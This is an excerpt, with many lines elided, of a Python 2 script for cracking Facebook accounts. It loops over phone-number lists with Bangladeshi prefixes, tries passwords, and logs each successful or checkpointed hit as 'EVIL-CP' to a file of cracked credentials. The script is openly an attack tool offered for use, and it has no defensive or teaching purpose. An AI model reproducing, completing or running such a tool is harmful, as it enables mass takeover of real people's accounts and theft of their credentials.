...
note=(green+"\n\n ============================= \n Author/Author : John Titor\n =============================\n Facebook : www.facebook.com/itz.evan.143\n=============================\n GITHUB : https://github.com/HUNT3ERC0BR4")---------------------------------------------------------
"""
back = 0
successful = []
cpb = []
oks = []
id = []
print 'AUTHOR : HUNT3ER_C0BR4'
print 'FACEBOOK : www.facebook.com/itz.evan.143'
print 'GITHUB :  https://github.com/HUNT3ERC0BR4'
CorrectUsername = 'john'
CorrectPassword = 'titor'
loop = 'true'
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
    else:
...
def action():
    ...
    if bch == '':
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (017) : ')
            k = '+88'
            idlist = '.txt'
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (018)  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (016) : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (019) : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (015) : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (013) : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE (014) : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        os.system('xdg-open https://www.facebook.com/itz.evan.143')
        time.sleep(1)
        menu()
    elif bch == '9':
        os.system('xdg-open https://www.facebook.com/itz.evan.143')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[EVIL-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[EVIL-CP] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Open After 07 Days]\n'
